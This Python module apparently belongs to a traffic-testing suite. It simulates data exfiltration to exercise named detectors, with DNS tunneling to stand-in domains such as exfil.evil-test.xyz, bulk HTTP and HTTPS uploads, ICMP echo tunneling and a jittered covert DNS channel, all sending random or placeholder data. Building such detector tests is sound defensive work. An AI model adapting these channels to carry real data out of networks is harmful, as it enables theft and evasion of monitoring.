"""
Data exfiltration simulation modules.

Tests against Watchtower detectors:
- watchtower.exfiltration (exfil.volume_anomaly)
- watchtower.stateful.host (exfil.volume_anomaly)
- watchtower.dns.tunnel (DNS-based exfil)
- watchtower.application.abuse (icmp.tunnel.suspected)
"""

import hashlib
import os
import random
import socket
import struct
import time
from typing import Optional

from traffic_testing.attacks.base import BaseAttack
from traffic_testing.config import (
    TARGET_IP, EXFIL_SLOW_DURATION, EXFIL_SLOW_CHUNK_SIZE,
    EXFIL_SLOW_INTERVAL, EXFIL_FAST_SIZE, EXFIL_FAST_CHUNK,
    ICMP_TUNNEL_PAYLOAD_SIZE, ICMP_TUNNEL_COUNT,
)


class DNSExfiltrationSlow(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, base_domain: str = "exfil.evil-test.xyz",
                 duration: float = EXFIL_SLOW_DURATION):
        super().__init__("dns_exfil_slow", "exfiltration", target_ip)
        self.base_domain = base_domain
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        query_count = 0
        total_bytes = 0
        exfil_data = os.urandom(8192)
        chunks = [exfil_data[i:i + EXFIL_SLOW_CHUNK_SIZE]
                  for i in range(0, len(exfil_data), EXFIL_SLOW_CHUNK_SIZE)]
        chunk_idx = 0
        while time.time() - start < self.duration and not self._stop_event.is_set():
            if chunk_idx >= len(chunks):
                chunk_idx = 0
            chunk = chunks[chunk_idx]
            encoded = chunk.hex()
            subdomain = f"{encoded[:32]}.{encoded[32:]}.e{chunk_idx}.{self.base_domain}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.0)
                dns_query = self._build_dns_query(subdomain)
                s.sendto(dns_query, (self.target_ip, 53))
                try:
                    s.recv(512)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "DNS",
                    "dst_ip": self.target_ip,
                    "dst_port": 53,
                    "query_name": subdomain,
                    "query_type": "A",
                    "chunk_size": len(chunk),
                    "chunk_index": chunk_idx,
                    "total_bytes": total_bytes + len(chunk),
                    "exfil_method": "dns_slow",
                    "test_for": "dns.tunnel.suspected",
                })
                s.close()
            except Exception as e:
                self.log_packet({"protocol": "DNS", "error": str(e)})
            query_count += 1
            chunk_idx += 1
            total_bytes += len(chunk)
            time.sleep(EXFIL_SLOW_INTERVAL)
        self.result.metadata.update({"total_queries": query_count, "total_bytes": total_bytes})

    def _build_dns_query(self, domain: str) -> bytes:
        tx_id = os.urandom(2)
        header = tx_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        question = b""
        for label in domain.split("."):
            question += bytes([len(label)]) + label.encode()
        question += b"\x00" + struct.pack(">HH", 1, 1)
        return header + question


class DNSExfiltrationFast(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, base_domain: str = "exfil-fast.evil-test.xyz",
                 total_bytes: int = 1024 * 1024):
        super().__init__("dns_exfil_fast", "exfiltration", target_ip)
        self.base_domain = base_domain
        self.total_bytes = total_bytes

    def execute(self) -> None:
        query_count = 0
        chunk_size = 48
        data_sent = 0
        while data_sent < self.total_bytes and not self._stop_event.is_set():
            chunk = os.urandom(min(chunk_size, self.total_bytes - data_sent))
            encoded = chunk.hex()
            max_label = 50
            parts = [encoded[i:i + max_label] for i in range(0, len(encoded), max_label)]
            subdomain = ".".join(parts) + f".{self.base_domain}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.5)
                dns_query = self._build_dns_query(subdomain)
                s.sendto(dns_query, (self.target_ip, 53))
                try:
                    s.recv(512)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "DNS",
                    "dst_ip": self.target_ip,
                    "dst_port": 53,
                    "query_name": subdomain[:80] + "...",
                    "query_type": "A",
                    "chunk_size": len(chunk),
                    "data_sent": data_sent,
                    "exfil_method": "dns_fast",
                })
                s.close()
            except Exception:
                pass
            query_count += 1
            data_sent += len(chunk)
            time.sleep(0.01)
        self.result.metadata.update({"total_queries": query_count, "total_bytes": data_sent})


class HTTPExfiltrationFast(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 8080,
                 total_bytes: int = EXFIL_FAST_SIZE):
        super().__init__("http_exfil_fast", "exfiltration", target_ip)
        self.port = port
        self.total_bytes = total_bytes

    def execute(self) -> None:
        data_sent = 0
        chunk_num = 0
        while data_sent < self.total_bytes and not self._stop_event.is_set():
            chunk_size = min(EXFIL_FAST_CHUNK, self.total_bytes - data_sent)
            payload = os.urandom(chunk_size)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.connect((self.target_ip, self.port))
                http_request = (
                    f"POST /upload HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"X-Chunk: {chunk_num}\r\n"
                    f"X-Exfil: true\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(http_request.encode() + payload)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "HTTP",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "method": "POST",
                    "path": "/upload",
                    "chunk_size": chunk_size,
                    "data_sent": data_sent + chunk_size,
                    "total_bytes": self.total_bytes,
                    "exfil_method": "http_fast",
                    "test_for": "exfil.volume_anomaly",
                })
                s.close()
            except Exception as e:
                self.log_packet({"protocol": "HTTP", "error": str(e)})
            data_sent += chunk_size
            chunk_num += 1
            time.sleep(0.1)
        self.result.metadata.update({"total_bytes": data_sent, "chunks": chunk_num})


class HTTPExfiltrationSlow(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 8080,
                 duration: float = EXFIL_SLOW_DURATION):
        super().__init__("http_exfil_slow", "exfiltration", target_ip)
        self.port = port
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        data_sent = 0
        chunk_num = 0
        while time.time() - start < self.duration and not self._stop_event.is_set():
            payload = os.urandom(512)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                http_request = (
                    f"POST /api/sync HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(http_request.encode() + payload)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "HTTP",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "method": "POST",
                    "path": "/api/sync",
                    "chunk_size": len(payload),
                    "data_sent": data_sent + len(payload),
                    "exfil_method": "http_slow",
                })
                s.close()
            except Exception:
                pass
            data_sent += len(payload)
            chunk_num += 1
            time.sleep(EXFIL_SLOW_INTERVAL)
        self.result.metadata.update({"total_bytes": data_sent, "chunks": chunk_num})


class ICMPExfiltration(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, total_count: int = ICMP_TUNNEL_COUNT):
        super().__init__("icmp_exfil", "exfiltration", target_ip)
        self.total_count = total_count

    def execute(self) -> None:
        try:
            from scapy.all import IP, ICMP, send, conf
            conf.verb = 0
            data_sent = 0
            for i in range(self.total_count):
                if self._stop_event.is_set():
                    break
                payload = os.urandom(ICMP_TUNNEL_PAYLOAD_SIZE)
                pkt = IP(dst=self.target_ip) / ICMP(type=8, id=random.randint(1, 65535), seq=i) / payload
                send(pkt, verbose=0)
                self.log_packet({
                    "protocol": "ICMP",
                    "dst_ip": self.target_ip,
                    "type": "Echo Request",
                    "seq": i,
                    "payload_size": len(payload),
                    "data_sent": data_sent + len(payload),
                    "exfil_method": "icmp",
                    "test_for": "icmp.tunnel.suspected",
                    "entropy_note": "Random high-entropy payload",
                })
                data_sent += len(payload)
                time.sleep(0.5)
            self.result.metadata.update({"total_bytes": data_sent, "count": self.total_count})
        except ImportError:
            for i in range(self.total_count):
                if self._stop_event.is_set():
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    s.settimeout(1.0)
                    payload = os.urandom(ICMP_TUNNEL_PAYLOAD_SIZE)
                    icmp_header = struct.pack(">BBHHH", 8, 0, 0,
                                              random.randint(1, 65535), i)
                    checksum = self._icmp_checksum(icmp_header + payload)
                    icmp_header = struct.pack(">BBHHH", 8, 0, checksum,
                                              random.randint(1, 65535), i)
                    s.sendto(icmp_header + payload, (self.target_ip, 0))
                    self.log_packet({
                        "protocol": "ICMP",
                        "dst_ip": self.target_ip,
                        "type": "Echo Request",
                        "seq": i,
                        "payload_size": len(payload),
                        "exfil_method": "icmp",
                    })
                    s.close()
                except Exception:
                    pass
                time.sleep(0.5)

    def _icmp_checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF


class HTTPSExfiltration(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 443,
                 total_bytes: int = 10 * 1024 * 1024):
        super().__init__("https_exfil", "exfiltration", target_ip)
        self.port = port
        self.total_bytes = total_bytes

    def execute(self) -> None:
        data_sent = 0
        chunk_num = 0
        while data_sent < self.total_bytes and not self._stop_event.is_set():
            chunk_size = min(64 * 1024, self.total_bytes - data_sent)
            payload = os.urandom(chunk_size)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.connect((self.target_ip, self.port))
                try:
                    s.send(b"\x16\x03\x01\x00\x05\x01\x00\x00\x01\x00")
                    s.recv(1024)
                except Exception:
                    pass
                http_request = (
                    f"POST /cloud/sync HTTP/1.1\r\n"
                    f"Host: cdn.cloud-service.example.com\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {chunk_size}\r\n"
                    f"X-Chunk: {chunk_num}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(http_request.encode() + payload)
                self.log_packet({
                    "protocol": "HTTPS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "method": "POST",
                    "path": "/cloud/sync",
                    "chunk_size": chunk_size,
                    "data_sent": data_sent + chunk_size,
                    "total_bytes": self.total_bytes,
                    "exfil_method": "https",
                    "test_for": "exfil.volume_anomaly",
                })
                s.close()
            except Exception as e:
                self.log_packet({"protocol": "HTTPS", "error": str(e)})
            data_sent += chunk_size
            chunk_num += 1
            time.sleep(0.5)
        self.result.metadata.update({"total_bytes": data_sent, "chunks": chunk_num})


class CovertHTTPDNSExfil(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, base_domain: str = "cdn-cache.evil-test.xyz",
                 duration: float = 1800):
        super().__init__("covert_http_dns_exfil", "exfiltration", target_ip)
        self.base_domain = base_domain
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        query_count = 0
        secret = b"SENSITIVE_DOCUMENT_CONTENT_CLASSIFIED_DATA" * 10
        chunk_size = 20
        chunks = [secret[i:i + chunk_size] for i in range(0, len(secret), chunk_size)]
        idx = 0
        while time.time() - start < self.duration and not self._stop_event.is_set():
            if idx >= len(chunks):
                idx = 0
            chunk = chunks[idx]
            encoded = chunk.hex()
            domain = f"{encoded}.cdn{idx % 100}.{self.base_domain}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.0)
                dns_query = self._build_dns_query(domain)
                s.sendto(dns_query, (self.target_ip, 53))
                try:
                    s.recv(512)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "DNS",
                    "dst_ip": self.target_ip,
                    "dst_port": 53,
                    "query_name": domain[:60] + "...",
                    "query_type": "A",
                    "chunk_index": idx,
                    "exfil_method": "covert_http_dns",
                    "test_for": "dns.tunnel.suspected",
                })
                s.close()
            except Exception:
                pass
            query_count += 1
            idx += 1
            time.sleep(random.uniform(0.5, 2.0))
        self.result.metadata["total_queries"] = query_count

    def _build_dns_query(self, domain: str) -> bytes:
        tx_id = os.urandom(2)
        header = tx_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        question = b""
        for label in domain.split("."):
            if len(label) > 63:
                label = label[:63]
            question += bytes([len(label)]) + label.encode()
        question += b"\x00" + struct.pack(">HH", 1, 1)
        return header + question
